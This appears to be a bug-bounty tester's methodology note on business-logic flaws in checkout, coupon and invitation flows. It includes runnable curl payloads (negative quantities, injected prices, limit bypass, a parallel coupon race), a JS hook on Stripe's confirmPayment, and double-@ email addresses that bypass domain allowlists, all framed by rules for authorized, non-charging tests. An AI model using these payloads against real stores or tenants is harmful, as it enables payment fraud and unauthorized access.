# Moraa — Business-logic & money bugs (the class no scanner finds)

> Folds in H1 (#364843 OLO negative-quantity total manipulation ·165 votes; #157996 Instacart coupon
> race; #1717650 Stripe coupon-limit race after "fix"; "$5k SQLi vs $25k price-manip" payout gap),
> and our the vendor shop pass (per-variant qty limit advisory-only in ValidateCart, unenforced by
> UpdateCheckout — Med). Deep pack: `offensive-business-logic` skill. Cross-ref [[race-condition]], [[graphql]].

## Prime rule: the CLIENT-side check is never the control
Every advisory/UI-side validation (a JS cap, a `validateCart` query, a disabled button, a hidden
field) must be re-enforced server-side on the state-changing call. Our shop Medium was exactly this:
`ValidateCart` rejected qty>1000, but the real `UpdateCheckout(addItems)` accepted 1001 → a $2M
checkout. **Always fire the mutation directly, bypassing the UI's pre-check.**

## Money-manipulation test matrix (prove with the server's own totals response)
| Test | How | Wins |
|---|---|---|
| **Negative quantity** | add a line item with `quantity:-N` (or a 2nd negative item) | total goes down / negative → OLO #364843. THE classic. |
| **Price/amount in body** | inject `price`/`total`/`amount`/`unitPrice` into cart/order mutation | server trusts client price (mass-assignment — see [[idor-access-control]]) |
| **Zero / fractional / overflow qty** | `0`, `1.5`, `2^31`, `2^63`, huge N | negative line total, stock/limit bypass, or 500 (robustness) |
| **Quantity/purchase-limit bypass** | UI caps per-item; hit the mutation directly above the cap | anti-scalping defeat (our finding) |
| **Currency confusion** | create checkout in a weak-currency store, switch `store`/`currency`/`country` AFTER total computes | pay 100 INR as 100 USD; test whether store is locked at creation (ours was → clean) |
| **Tax zeroing** | switch to a tax-exempt jurisdiction / `skipTaxCalculation` / address swap post-total | tax drops without re-calc |
| **Shipping** | inject foreign/negative `shippingRateId` | free/negative shipping (ours: foreign IDs ignored → clean) |
| **Rounding / currency-decimal** | quantities/prices that round in your favor (0.005 × N) | sub-cent skimming |

## Runnable checks (fire the mutation directly, never through the UI)

```bash
H="https://TARGET"; AUTH="Cookie: session=<yours>"; CT="Content-Type: application/json"

# negative quantity — THE classic (OLO #364843): total goes DOWN or negative
# (REST shape; for GraphQL swap in the cart mutation — same fields)
curl -s "$H/api/cart/items" -H "$AUTH" -H "$CT" \
     -d '{"storeProductVariantId":12345,"quantity":-1}' | jq .

# price/amount injection — does the server accept a client-supplied price? (mass-assignment half)
curl -s "$H/api/cart/items" -H "$AUTH" -H "$CT" \
     -d '{"storeProductVariantId":12345,"quantity":1,"price":0.01,"unitPrice":0.01}' | jq .

# qty/purchase-limit bypass — ValidateCart capped it; the state-changing call decides
# (our shop find: ValidateCart rejected qty>1000, UpdateCheckout accepted 1001)
curl -s "$H/api/checkout/addItems" -H "$AUTH" -H "$CT" \
     -d '{"addItems":[{"storeProductVariantId":12345,"quantity":1001}]}' | jq .

# zero / fractional / overflow quantities in one pass
for q in 0 1.5 2147483648 9223372036854775808 99999999; do
  curl -s -o /dev/null -w "$q -> %{http_code}\n" "$H/api/cart/items" -H "$AUTH" -H "$CT" \
       -d "{\"storeProductVariantId\":12345,\"quantity\":$q}"
done

# currency/store confusion — switch store AFTER the total computes
curl -s "$H/api/checkout" -X PATCH -H "$AUTH" -H "$CT" \
     -d '{"store":"<weaker-currency-store-id>","currency":"INR"}' | jq '.total'

# workflow skip — jump straight to confirm/fulfilment without the payment/KYC step
curl -s -i "$H/api/checkout/confirm" -X POST -H "$AUTH" -H "$CT" -d '{}' | head -12
```

**Impact gate:** the win is the SERVER'S totals/confirm response showing the illegitimate value
(negative total, tampered price honoured above the cap, confirm without payment). A 200 that
silently normalizes the value back is not a finding. Money rules (below) are absolute: stop at
the last pre-authorization step; never complete a real charge.

## Coupon / discount (high-yield, and a race target)
- **Stacking:** apply 2+ codes; apply the same code twice; combine with an auto-discount.
- **Reuse of single-use:** replay after redemption; **case/whitespace variants** (`SAVE10` vs `save10 `) to dodge a used-flag keyed on exact string.
- **Cross-store / expired:** apply another store's or an expired code.
- **RACE (H1 #157996, #1717650):** fire N simultaneous apply requests — all pass the `used==false`
  check before any records the redemption → code applied N times, or over its per-user/global limit.
  Even "fixed" limiters often still race (Stripe #1717650). See [[race-condition]] for single-packet/parallel technique. Small burst (5–10) as proof, never a flood.

  ```bash
  # coupon race — 8 parallel applies of a single-use code; a second 200 = the used==false check lost
  seq 1 8 | xargs -P8 -I{} curl -s -o /dev/null -w '%{http_code} ' \
    "$H/api/cart/coupon" -H "$AUTH" -H "$CT" -d '{"code":"SAVE10"}'; echo
  # stacking / variants: same code twice, case+whitespace against a used-flag keyed on exact string
  for c in SAVE10 save10 "SAVE10%20" SAVE10SAVE10; do
    curl -s -o /dev/null -w "$c -> %{http_code}\n" "$H/api/cart/coupon" -H "$AUTH" -H "$CT" -d "{\"code\":\"$c\"}"
  done
  ```

## Workflow / state-machine abuse
- **Skip steps:** jump straight to the confirm/fulfilment call without the prerequisite step (payment, verification, KYC).
- **Mutate after authorization:** change cart/price/address AFTER payment is authorized but before capture.
- **Replay a one-time token / re-use a `checkoutId`.**
- **Reorder the sequence:** confirm → then apply discount; or run steps out of order.
- **Quota/subscription abuse:** exceed plan limits, re-trigger free-trial, downgrade-after-consume, refund-then-keep.

## Discovery: the schema IS the attack surface
Introspection is usually off on money APIs (ours was) and errors are masked — **mine the frontend
bundle** for every cart/checkout/order/discount/tax mutation, its exact input type, and which fields
are client-supplied vs server-computed. A field the server computes (no client `price`) closes
price-tampering at that layer; a client-supplied one is the candidate. (Ours: `CartItem =
{storeProductVariantId, quantity}` only — no price field — so tampering wasn't reachable at the cart layer.)

## Rules of engagement (money = careful)
NEVER complete a real purchase / trigger a real charge, refund, or subscription. Stop at the last
pre-authorization step and prove the flaw with the **totals response showing the illegitimate value**.
If proving it requires an actual transaction, document exactly what you'd send and what response
proves it — don't execute. Abandon carts you create. Own accounts only.

## Why it pays
Business-logic is consistently H1's highest-value category (the $25k price-manip vs $5k SQLi gap) and
"the bug no scanner finds" — because it needs a human to understand the flow. After OWASP-Top-10
surface is covered on a transactional/marketplace/fintech target, this is where the crown jewels are.

## Payment-flow proofs WITHOUT firing a payment: patch the SDK at the prototype (2026-10-15, acme.example storefronts)
When the sink is a client SDK call (`stripe.confirmPayment`, `razorpay.checkout.open`, …) that only
fires on the pay button — i.e. past the "never submit card data / never complete a payment" line —
do not drive the payment. Patch the SDK method in the page and read the **arguments**:

```js
// in-page (Playwright evaluate / devtools), any time BEFORE the pay click:
const patch = (S) => { S.prototype.confirmPayment = function (opts) {
  window.__capture.push({ return_url: opts?.confirmParams?.return_url, redirect: opts?.redirect });
  return new Promise(() => {});          // intercepted: never executes, nothing transmits
}; return S; };
window.Stripe ? patch(window.Stripe)
  : Object.defineProperty(window, "Stripe", { configurable: true, set(v){ this._v = patch(v); }, get(){ return this._v; } });
```
The captured `confirmParams.return_url` **is** the field that would have landed in the
`/v1/payment_intents/<pi>/confirm` body — JS-level proof, zero card data, zero network. A
`window.X` setter hook covers lazily-loaded SDKs. Record in the finding that the JS argument is
the source of the request body field (equivalent proof, stronger isolation).

Same engagement, two reusable patterns: (1) **per-tab sessionStorage poisoning of frame-gated
fallbacks** — an embed param persisted to sessionStorage at top level is later read by a *framed*
instance of the same origin in the same tab (frame-gated fallback `window.self !== window.top`
frozen at app mount); check both the framing CSP (`frame-ancestors`) and the storage gate before
calling a client-side carry-over dead or alive. (2) **payment providers are per-region** on
multi-region storefronts — the shared bundle contains every provider's sink, but which one runs per
store must be confirmed live (`window.Stripe` vs `window.Razorpay` vs iframe hosts) before assuming
a sink is reachable; on acme.example BR, cards run Razorpay and the Stripe confirm sink is dormant.

---

## Email-parser differential vs an admin-configured domain allowlist

Any product that lets a tenant admin restrict invitations/signups to approved email domains has to
extract a domain from a user-supplied address. Almost every implementation does it wrong, and the
wrong way is always the same: **`email.split("@")[1]`, exact-matched against the allowlist.**

That is a *different* domain from the one an MTA will use, because RFC-5321 delivery resolves the
address at the **last** `@`. So `victim@allowed.com@attacker.com` passes a validator reading field
2 and delivers to `attacker.com`.

**Four families that beat a naive split (all confirmed live on the enterprise-identity product, 2026-10-24,
`add_worker` under an armed `["test.com"]` allowlist):**

| family | address | why it passes |
|---|---|---|
| double-@ | `u@allowed.com@attacker.com` | `split("@")[1]` == `allowed.com` |
| percent-encoded @ | `u%40attacker.com@allowed.com` | the `%40` sits in the local part; decoded downstream |
| RFC-2047 encoded word | `=?utf-8?q?u=40attacker.com?=@allowed.com` | decoded by any conformant mail consumer |
| empty local part | `@allowed.com` | no non-empty-local assertion |

**The discriminating experiment — run this before claiming the mechanism.** Send the same shape
twice with the allowlisted domain on either side of the second `@`:

```
u@allowed.com@attacker.com   -> ACCEPTED
u@attacker.com@allowed.com   -> REFUSED
```

If the verdict **flips**, the check is reading field 2 of a split, and you can now predict every
other result instead of guessing. Confirm with three that must refuse under that rule:
`u@allowed.com%40attacker.com` (field 2 is the whole mangled string), `u@allowed.com.` (trailing
dot breaks exact match), `"u@attacker.com"@allowed.com` (quoted-local puts the attacker domain in
field 2). A mechanism that predicts the refusals too is what survives triage; "the parser is weak"
does not.

**Severity discipline.** Acceptance + verbatim storage is the proven part, and on its own it is a
Medium: the writer needs an invite-capable role, which is exactly the principal the restriction
exists to constrain — so it is a product self-contradiction (admin arms a boundary, server ignores
it), not a "this role is too powerful" argument. **Do not assert delivery** unless you have
exercised it: the escalation to High is whether platform mail to that member actually reaches the
attacker domain. Prove it with an operator-owned recipient (`you+tag@gmail.com` as the LAST
segment) so no third party is contacted, never by mailing an attacker-controlled host.

**Always arm the restriction and fire the negative control in the same session** (plain
out-of-domain address → the refusal code). Without that control, an "accepted" result may just
mean the restriction was never on — and note that the enum value the GUI writes may differ from
the one the API accepts (that estate: GUI `SPECIFY` persists; the same value written via the API silently
reverts to `ANY`, which would make a triager see no restriction at all).
